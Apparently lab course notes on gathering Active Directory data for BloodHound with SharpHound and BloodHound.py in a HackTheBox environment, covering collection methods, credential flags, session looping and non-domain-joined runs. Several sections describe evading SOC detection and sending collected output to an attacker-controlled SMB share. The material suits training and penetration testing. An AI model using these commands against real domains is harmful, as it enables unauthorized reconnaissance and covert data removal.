# Gathering Data

## SharpHound - Data Collection from Windows
SharpHound is the official data collector tool for BloodHound, is written in C# and can be run on Windows systems with the .NET framework installed. The tool uses various techniques to gather data from Active Directory, including native Windows API functions and LDAP queries.

Reference: https://github.com/BloodHoundAD/SharpHound

Reference: https://github.com/BloodHoundAD/BloodHound

### Basic Enumeration
```
.\SharpHound.exe
```

To get the information for local groups and sessions, SharpHound will attempt to connect to each domain-joined Windows computer from the list of computers it collected. If the user from which SharpHound is running has privileges on the remote computer, it will collect the following information:
1. The members of the local administrators, remote desktop, distributed COM, and remote management groups.
2. Active sessions to correlate to systems where users are interactively logged on.

> Note: Gathering information from domain-joined machines, such as **local group membership** and **active sessions**, is only possible if the user session from which **SharpHound is being executed has Administrator rights on the target computer**.

## Importing Data into BloodHound

```
net start neo4j
```

Once the upload is complete, we can analyze the data. If we want to view information about the domain, we can type **`Domain:INLANEFREIGHT.HTB`** into the search box. This will show an icon with the domain name. If you click the icon, it will display information about the node (the domain), how many users, groups, computers, OUs, etc.

![image](https://github.com/user-attachments/assets/bc9394bd-410e-4318-a35f-fb76bb1fe465)


## SharpHound - Data Collection from Windows (Part 2)

```
SharpHound.exe --help
```

### Collection Methods

Reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html#collectionmethod

The option `--collectionmethod` or `-c` allows us to specify what kind of data we want to collect. In the help menu above, we can see the list of collection methods. Let's describe some of them that we haven't covered:

- `All`: Performs all collection methods except GPOLocalGroup.
- `DCOnly`: Collects data only from the domain controller and will not try to get data from domain-joined Windows devices. It will collect users, computers, security groups memberships, domain trusts, abusable permissions on AD objects, OU structure, Group Policy, and the most relevant AD object properties. It will attempt to correlate Group Policy-enforced local groups to affected computers.
- `ComputerOnly`: This is the opposite of DCOnly. It will only collect information from domain-joined computers, such as user sessions and local groups.

Depending on the scenario we are in, we will choose the method that best suits our needs. Let's see the following use case:

We are in an environment with 2000 computers, and they have a SOC with some network monitoring tools. We use the `Default` collection method but forget the computer from where we run `SharpHound`, which will try to connect to every computer in the domain.

Our attack host started generating traffic to all workstations, and the SOC quarantined our machine.

In this scenario, we should use `DCOnly` instead of `All` or `Default`, as it generates only traffic to the domain controller. We could pick the most interesting target machine and add them to a list (e.g: `computers.txt`). Then, we would rerun `SharpHound` using the `ComputerOnly` collection method and the `--computerfile` option to try to enumerate only the computers in the `computers.txt` file.

It is essential to know the methods and their implications. The following table, created by SadProcessor, shows a general reference of the communication protocols used by each method and information on each technique, among other things:

It is essential to know the methods and their implications. The following table, created by SadProcessor, shows a general reference of the communication protocols used by each method and information on each technique, among other things:

![image](https://github.com/user-attachments/assets/a19c19c8-9ba5-4904-a589-300e411c9499)

> Note: This table was created for an older version of SharpHound. Some options no longer exist, and others have been modified, but it still provides an overview of the collection methods and their implications. For more information, visit the BloodHound documentation page.

### Common used flags

**If we get credentials from a user other than the context from which we are running, we can use the `--ldapusername` and `--ldappassword` options to run SharpHound using those credentials.**

Another flag we find helpful is `-d` or `--domain`. Although this option is assigned by default, if we are in an environment where multiple domains exist, we can use this option to ensure that `SharpHound` will collect the information from the domain we specify.

SharpHound will capture the domain controller automatically, but if we want to target a specific DC, we can use the option `--domaincontroller` followed by the _IP_ or _FQDN_ of the target domain controller. This option could help us target a forgotten or secondary domain, which may have less security or monitoring tools than the primary domain controller. Another use case for this flag is if we are doing port forward, we can specify an IP and port to target. We can use the flag `--ldapport` to select a port.

### Randomize and hide SharpHound Output

It is known that SharpHound, by default, generates different `.json` files, then saves them in a zip file. It also generates a randomly named file with a `.bin` extension corresponding to the cache of the queries it performs. Defense teams could use these patterns to detect bloodhound. One way to try to hide these traces is by combining some of these options:

- `--memcache`	Keep cache in memory and don't write to disk.
- `--randomfilenames`	Generate random filenames for output, including the zip file.
- `--outputprefix`	String to prepend to output file names.
- `--outputdirectory`	Directory to output file too.
- `--zipfilename`	Filename for the zip.
- `--zippassword`	Password protects the zip with the specified password.

For example, we can use the `--outputdirectory` to target a shared folder and randomize everything. Let's start a shared folder in our PwnBox:

- **Start the shared folder with username and password**
```
sudo impacket-smbserver share ./ -smb2support -user test -password test
```

Now let's connect to the shared folder and save SharpHound output there:
```
net use \\10.10.14.33\share /user:test test
```

- **Running SharpHound and saving the output to a shared folder**
```
C:\Tools\SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword HackTheBox --outputprefix HTB --randomfilenames
```
- **Unzipping the file**
```
unzip ./HTB_20230111113143_5yssigbd.w3f
```

### Session Loop Collection Method

When a user establishes a connection to a remote computer, it creates a session. The session information includes the username and the computer or IP from which the connection is coming. While active, the connection remains in the computer, but after the user disconnects, the session becomes idle and disappears in a few minutes. This means we have a small window of time to identify sessions and where users are active.

> Note: In Active Directory environments, it is important to understand where users are connected because it helps us understand which computers to compromise to achieve our goals.

Let's open a command prompt in the target machine and type **`net session`** to identify if there are any session active:

There are no active sessions, which means that if we run SharpHound right now, it will not find any session on our computer. When we run the SharpHound default collection method, it also includes the Session collection method. This method performs one round of session collection from the target computers. If it finds a session during that collection, it will collect it, but if the session expires, we won't have such information. That's why SharpHound includes the option `--loop`. We have a couple of options to use with loops in SharpHound:

- `--Loop`	Loop computer collection.
- `--loopduration`	Duration to perform looping (Default 02:00:00).
- `--loopinterval`	Interval to sleep between loops (Default 00:00:30).
- `--stealth`	Perform "stealth" data collection. Only touch systems are the most likely to have user session data.

If we want to search sessions for the following hour and query each computer every minute, we can use SharpHound as follow:

- **Session Loop**
```
SharpHound.exe -c Session --loop --loopduration 01:00:00 --loopinterval 00:01:00
```

Watch the video How BloodHound's session collection works from the SpecterOps team for a deeper explanation of this collection method. Here is another excellent blog post from Compass Security regarding session enumeration by Sven Defatsch.

Reference: https://www.youtube.com/watch?v=q86VgM2Tafc

Reference: https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-2/

> Note: BloodHound video was recorded before Microsoft introduced the requirement to be an administrator to collect session data.

### Running from Non-Domain-Joined Systems

Sometimes we might need to run SharpHound from a computer, not a domain member, such as when conducting a HackTheBox attack or internal penetration test with only network access.

In these scenarios, we can use `runas /netonly /user:<DOMAIN>\<username> <app>` to execute the application with specific user credentials. **The `/netonly` flag ensures network access using the provided credentials**.

- **Connect via RDP to the**
```
xfreerdp /v:10.129.204.207:13389 /u:haris /p:Hackthebox /dynamic-resolution /drive:.,linux
```

Before using SharpHound, we need to be able to resolve the DNS names of the target domain, and if we have network access to the domain's DNS server, we can configure our network card DNS settings to that server. If this is not the case, we can set up our hosts file and include the DNS names of the domain controller.

Configure the DNS server to the IP 172.16.130.3 (Domain Controller Internal IP). In this exercise the DNS are already configured, there is no need to change them.

![image](https://github.com/user-attachments/assets/1f951938-4a27-4f89-9faa-0c7a9eafdb6b)

Run `cmd.exe` and execute the following command to launch another cmd.exe with the htb-student credentials. It will ask for a password. The password is HTBRocks!:
```
runas /netonly /user:INLANEFREIGHT\htb-student cmd.exe
```

> Note: `runas /netonly` does not validate credentials, and if we use the wrong credentials, we will notice it while trying to connect through the network.

Execute `net view \\inlanefreight.htb\` to confirm we had successfully authenticated.

```
net view \\inlanefreight.htb\
```

Run `SharpHound.exe` with the option `--domain`:
```
SharpHound.exe -d inlanefreight.htb
```

## BloodHound.py - Data Collection from Linux

Reference: https://github.com/fox-it/BloodHound.py

BloodHound.py, a Python-based collector for BloodHound based on Impacket, to allow us to collect Active Directory information from Linux for BloodHound.

## Installation

We can install `BloodHound.py` with `pip install bloodhound` or by cloning its repository and running `python setup.py install`. To run, it requires `impacket`, `ldap3`, and `dnspython`. The tool can be installed via `pip` by typing the following command:

- **Install BloodHound.py**
```
pip install bloodhound
```

To install it from the source, we can clone the BloodHound.py GitHub repository and run the following command:

- **Install BloodHound.py from the source**
```
git clone https://github.com/fox-it/BloodHound.py -q
cd BloodHound.py/
sudo python3 setup.py install
```

### Using BloodHound.py

To use `BloodHound.py` in Linux, we will need `--domain` and `--collectionmethod` options and the authentication method. Authentication can be a username and password, an NTLM hash, an AES key, or a `ccache` file. BloodHound.py will try to use the Kerberos authentication method by default, and if it fails, it will fall back to NTLM.

Another critical piece is the domain name resolution. If our DNS server is not the domain DNS server, we can use the option `--nameserver`, which allows us to specify an alternative name server for queries.
```
bloodhound-python -d inlanefreight.htb -c DCOnly -u htb-student -p HTBRocks! -ns 10.129.204.207 -k
```

> **Note: Kerberos authentication requires the host to resolve the domain FQDN. This means that the option --nameserver is not enough for Kerberos authentication because our host needs to resolve the DNS name KDC for Kerberos to work. If we want to use Kerberos authentication, we need to set the DNS Server to the target machine or configure the DNS entry in our hosts' file**.

Let's add the DNS entry in our hosts file:

- **Setting up the `/etc/hosts` file**
```
echo -e "\n10.129.204.207 dc01.inlanefreight.htb dc01 inlanefreight inlanefreight.htb" | sudo tee -a /etc/hosts
```

Use BloodHound.py with Kerberos authentication:

- **Using BloodHound.py with Kerberos authentication**
```
bloodhound-python -d inlanefreight.htb -c DCOnly -u htb-student -p HTBRocks! -ns 10.129.204.207 --kerberos
```

> Note: Kerberos Authentication is the default authentication method for Windows. Using this method instead of NTLM makes our traffic look more normal.

Once the collection finishes, it will produce the JSON files, but by default, it won't zip the content as SharpHound does. If we want the content to be placed in a zip file, we need to use the option `--zip`.
